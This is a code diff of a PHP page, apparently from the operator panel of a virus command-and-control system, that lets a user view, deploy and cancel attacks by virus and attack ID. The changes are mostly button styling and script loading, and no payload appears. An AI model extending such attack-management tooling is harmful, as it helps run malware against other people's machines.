@@ -39,7 +39,7 @@ $user = $userFactory->get($session->get("user_handle")); ?>
 <html lang="en_US">
 <head>
     <title>Attack info</title>
-    <?php echo HtmlTemplate::header(); ?>
+    <?php HtmlTemplate::header(); ?>
     <?php @include($packageDirectory . "/ui/styles.php"); ?>
 </head>
 <body>
@@ -78,16 +78,15 @@ $user = $userFactory->get($session->get("user_handle")); ?>
 <textarea id="profile" class="w3-input"><?php echo $attack->getProfile(); ?></textarea>
 <br>
 <?php @include($packageDirectory . "/ui/fields.php"); ?>
-<div class="w3-button w3-red" onclick="update()">Update</div>
+<button class="w3-btn w3-blue-grey" onclick="update()">Update</button>
 <?php
 switch ($attack->getStatus()) {
     case AttackBase::STATUS_DORMANT: ?>
-        <p>This attack is dormant. Click <a onclick="deployAttack()" class="link">here</a> to deploy.</p>
+        <button class="w3-btn w3-light-green" onclick="deployAttack()">Deploy</button>
         <?php @include($packageDirectory . "/ui/message_dormant.php");
         break;
     case AttackBase::STATUS_DEPLOYED: ?>
-        <p>This attack is deployed. Click <a onclick="cancelAttack()" class="link">here</a> to cancel the
-            attack.</p>
+        <button class="w3-btn w3-light-green" onclick="cancelAttack()">Cancel</button>
         <?php @include($packageDirectory . "/ui/message_deployed.php");
         break;
     case AttackBase::STATUS_EXECUTED:
@@ -97,8 +96,7 @@ switch ($attack->getStatus()) {
         Logs::error("Attack status of " . $attack->getStatus() . " is not defined. This really should not happen at all and please dig into it immediately.");
 }
 @include($packageDirectory . "/ui/footnote.php"); ?>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
-<script type="text/javascript" src="https://157239n.com/page/assets/js/main.js"></script>
+<?php HtmlTemplate::scripts(); ?>
 <script type="application/javascript">
     function update() {
         $.ajax({
@@ -168,7 +166,17 @@ switch ($attack->getStatus()) {
             url: "<?php echo DOMAIN . "/vrs/" . $attack->getVirusId() . "/aks/" . $attack->getAttackId() . "/ctrls/executed"; ?>",
             type: "POST",
             success: function (response) {
-                if (response === "1") window.location = "<?php echo DOMAIN_ATTACK_INFO; ?>";
+                if (response === "1")
+                    $.ajax({
+                        url: "<?php echo DOMAIN . "/ctrls/setAttackId"; ?>",
+                        type: "POST",
+                        data: {
+                            attack_id: "<?php echo $attack->getAttackId(); ?>"
+                        },
+                        success: function (response) {
+                            window.location = "<?php echo DOMAIN_ATTACK_INFO; ?>";
+                        }
+                    });
             }
         })
     }
